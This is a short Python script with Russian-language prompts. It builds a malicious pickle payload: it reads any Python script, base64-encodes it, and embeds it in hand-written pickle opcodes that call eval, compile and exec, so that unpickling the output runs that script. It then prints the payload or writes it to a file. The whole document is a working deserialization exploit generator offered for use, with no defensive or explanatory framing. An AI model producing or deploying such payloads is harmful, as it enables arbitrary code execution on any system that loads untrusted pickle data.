from base64 import b64encode

path = input('Введите название python скрипта>')
try:
    data = open(path, 'rb').read()
except FileNotFoundError:
    print('File not found')
    exit()

data = b64encode(data)

payload = b'c__builtin__\neval\n(c__builtin__\ncompile\n(Vfrom base64 import b64decode;exec(b64decode("' + data + b'").decode())\nV-\nVexec\ntRtR.'

print('''
1 - вывести payload
2 - сохранить payload в файл
''')

ask = int(input('>'))
if ask == 2:
    name = input('Введите название выходного файла>')
    file = open(name, 'wb')
    file.write(payload)
    file.close()
    print('Payload сохранен в файл ' + name)
else:
    print(payload)
